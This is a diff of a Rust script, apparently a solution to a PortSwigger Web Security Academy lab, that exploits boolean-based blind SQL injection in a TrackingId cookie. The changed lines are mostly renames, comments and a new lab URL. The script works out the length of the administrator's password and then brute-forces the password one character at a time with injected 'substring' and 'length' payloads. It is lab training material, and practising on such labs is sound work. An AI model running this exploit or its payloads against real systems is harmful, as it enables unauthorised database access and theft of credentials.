@@ -1,6 +1,6 @@
 /***************************************************************************************
 *
-* Author: Ahmed Elqalawii
+* Author: Ahmed Elqalawy (@elqal3awii)
 *
 * Date: 22/9/2023
 *
@@ -53,7 +53,7 @@ lazy_static! {
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a11005603697562837441a600bd00b1.web-security-academy.net";
+    let url = "https://0afa007403020b238475c2c400240048.web-security-academy.net";
     // build the client used in all subsequent requests
     let client = build_client();
     // build the ranges; every range will be executed in different thread
@@ -249,14 +249,14 @@ fn determine_password_length(client: &Client, url: &str) -> usize {
         );
         io::stdout().flush();
         // payload to determine password length
-        let determine_length_payload = format!(
+        let payload = format!(
             "' or length((select password from users where username = 'administrator')) = {} -- -",
             i
         );
         // fetch the page with the injected payload
-        let determine_length_injection = client
+        let injection = client
             .get(format!("{url}/filter?category=Pets"))
-            .header("Cookie", format!("TrackingId={determine_length_payload}"))
+            .header("Cookie", format!("TrackingId={payload}"))
             .send()
             .expect(&format!(
                 "{}",
@@ -264,10 +264,11 @@ fn determine_password_length(client: &Client, url: &str) -> usize {
                     .red()
             ));
 
-        let mut body = determine_length_injection.text().unwrap();
+        let mut body = injection.text().unwrap();
         // extract the name of users table
         let welcom_text = extract_pattern("Welcome back!", &body);
 
+        // if the welcome text is returned in the response
         if welcom_text.is_some() {
             println!(
                 " [ {} {} ]",
@@ -297,27 +298,28 @@ fn brute_force_password(client: &Client, url: &str, ranges: Vec<Vec<i32>>) {
                 );
                 io::stdout().flush();
                 // payload to brute force password
-                let brute_force_payload = format!(
+                let payload = format!(
                 "' or substring((select password from users where username = 'administrator'), {}, 1) = '{}' -- -",
                 position+1,
                 character
             );
                 // fetch the page with the injected payload
-                let characters_injection = client
+                let injection = client
                 .get(format!("{url}/filter?category=Pets"))
-                .header("Cookie", format!("TrackingId={brute_force_payload}"))
+                .header("Cookie", format!("TrackingId={payload}"))
                 .send()
                 .expect(&format!(
                     "{}",
-                    "[!] Failed to fetch the page with the injected payload to determine password length"
+                    "[!] Failed to fetch the page with the injected payload to brute force password"
                         .red()
                 ));
 
                 // body of the response
-                let mut body = characters_injection.text().unwrap();
+                let mut body = injection.text().unwrap();
                 // extract the name of users table
                 let welcom_text = extract_pattern("Welcome back!", &body);
 
+                // if the welcome text is returned in the response
                 if welcom_text.is_some() {
                     CHARS_FOUND.fetch_add(1, Ordering::Relaxed);
                     VALID_PASSWORD.lock().unwrap().replace_range(*position as usize..*position as usize +1, &character.to_string());
